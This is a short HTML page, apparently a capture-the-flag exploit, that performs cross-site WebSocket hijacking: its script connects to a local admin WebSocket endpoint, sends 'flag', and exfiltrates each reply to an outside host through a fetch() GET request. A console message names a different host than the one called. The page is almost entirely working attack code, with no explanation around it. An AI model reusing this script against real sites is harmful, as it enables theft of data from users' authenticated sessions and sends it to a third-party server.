<!DOCTYPE html>
<html>
<head>
    <title>Cross-site WebSocket Hijacking</title>
</head>
<body>
    <script>
        // Create a new WebSocket object pointing to the target endpoint
        var webSocket = new WebSocket('wss://127.0.0.1:8080/admin/ws');
        
        webSocket.onopen = function() {
            // Send "flag" message when the WebSocket connection is established
            webSocket.send("flag");
        };
        
        webSocket.onmessage = function(event) {
            // Extract data from the WebSocket message
            var extractedData = event.data;

            // Send the extracted data to your site using a GET request
            fetch('https://mehtix.fhiran.com/flag?myflag=' + encodeURIComponent(extractedData), {
                method: 'GET'
            }).then(response => {
                console.log('Data sent to https://mysite.com/flag successfully.');
            }).catch(error => {
                console.error('Error sending data:', error);
            });
        };
    </script>
    <p>Fetching WebSocket data...</p>
</body>
</html>
